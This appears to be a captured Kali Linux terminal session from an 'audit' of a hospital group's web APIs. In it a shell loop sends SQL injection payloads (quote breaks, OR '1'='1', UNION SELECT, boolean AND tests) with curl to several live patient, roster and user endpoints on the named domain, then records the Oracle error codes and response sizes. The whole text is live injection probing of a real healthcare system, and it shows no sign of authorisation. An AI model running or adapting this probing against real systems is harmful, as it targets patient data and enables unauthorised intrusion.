@@ -1,0 +1,56 @@
+                                                                                                                                                                                                                                                                                                                           
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ cd ~/narayana-audit && echo "=== IS IT INJECTION OR TYPE CONVERSION? ===" && for ep in "NnoteApi/api/Patient/Info" "NnoteApi/api/Roster/Employee/Shift" "NtraktApi/api/User/Info" "NnoteApi/api/Patient/ConsultDetails" "NnoteApi/api/Patient/GetOPPatient" ; do echo "--- /$ep/{payload} ---" ; for pl in "1" "abc" "1%27" "1%27%20OR%20%271%27%3D%271" "1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL--" "1%20AND%201%3D1" "1%20AND%201%3D2" ; do printf "   %-38s " "$pl" ; curl -k -s -m 15 "https://narayanagroup.co.in/$ep/$pl" -o /tmp/i.json ; python3 -c "
+import json,re
+t=open('/tmp/i.json',encoding='utf-8',errors='replace').read()
+m=re.search(r'ORA-\d{5}',t)
+try:
+    d=json.loads(t).get('data'); n=str(len(d)) if isinstance(d,list) else ('0' if not d else '1')
+except Exception: n='?'
+print('ORA:%-9s recs:%-4s bytes:%d' % (m.group(0) if m else '-', n, len(t)))
+" ; done ; done ; rm -f /tmp/i.json
+=== IS IT INJECTION OR TYPE CONVERSION? ===
+--- /NnoteApi/api/Patient/Info/{payload} ---
+   1                                      ORA:-         recs:0    bytes:11
+   abc                                    ORA:ORA-06502 recs:?    bytes:101
+   1%27                                   ORA:ORA-06502 recs:?    bytes:101
+   1%27%20OR%20%271%27%3D%271             ORA:ORA-06502 recs:?    bytes:101
+   1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL-- ORA:ORA-06502 recs:?    bytes:101
+   1%20AND%201%3D1                        ORA:ORA-06502 recs:?    bytes:101
+   1%20AND%201%3D2                        ORA:ORA-06502 recs:?    bytes:101
+--- /NnoteApi/api/Roster/Employee/Shift/{payload} ---
+   1                                      ORA:-         recs:0    bytes:11
+   abc                                    ORA:ORA-01722 recs:0    bytes:1981
+   1%27                                   ORA:ORA-01722 recs:0    bytes:1981
+   1%27%20OR%20%271%27%3D%271             ORA:ORA-01722 recs:0    bytes:1981
+   1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL-- ORA:ORA-01722 recs:0    bytes:1981
+   1%20AND%201%3D1                        ORA:ORA-01722 recs:0    bytes:1981
+   1%20AND%201%3D2                        ORA:ORA-01722 recs:0    bytes:1981
+--- /NtraktApi/api/User/Info/{payload} ---
+   1                                      ORA:-         recs:0    bytes:11
+   abc                                    ORA:ORA-01722 recs:0    bytes:1900
+   1%27                                   ORA:ORA-01722 recs:0    bytes:1900
+   1%27%20OR%20%271%27%3D%271             ORA:ORA-01722 recs:0    bytes:1900
+   1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL-- ORA:ORA-01722 recs:0    bytes:1900
+   1%20AND%201%3D1                        ORA:ORA-01722 recs:0    bytes:1900
+   1%20AND%201%3D2                        ORA:ORA-01722 recs:0    bytes:1900
+--- /NnoteApi/api/Patient/ConsultDetails/{payload} ---
+   1                                      ORA:-         recs:0    bytes:11
+   abc                                    ORA:ORA-01722 recs:0    bytes:1985
+   1%27                                   ORA:ORA-01722 recs:0    bytes:1985
+   1%27%20OR%20%271%27%3D%271             ORA:ORA-01722 recs:0    bytes:1985
+   1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL-- ORA:ORA-01722 recs:0    bytes:1985
+   1%20AND%201%3D1                        ORA:ORA-01722 recs:0    bytes:1985
+   1%20AND%201%3D2                        ORA:ORA-01722 recs:0    bytes:1985
+--- /NnoteApi/api/Patient/GetOPPatient/{payload} ---
+   1                                      ORA:-         recs:0    bytes:11
+   abc                                    ORA:ORA-01722 recs:0    bytes:1971
+   1%27                                   ORA:ORA-01722 recs:0    bytes:1971
+   1%27%20OR%20%271%27%3D%271             ORA:ORA-01722 recs:0    bytes:1971
+   1%27%20UNION%20SELECT%20NULL%20FROM%20DUAL-- ORA:ORA-01722 recs:0    bytes:1971
+   1%20AND%201%3D1                        ORA:ORA-01722 recs:0    bytes:1971
+   1%20AND%201%3D2                        ORA:ORA-01722 recs:0    bytes:1971
+                                                                                                                                                                                                                                            
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ 
+
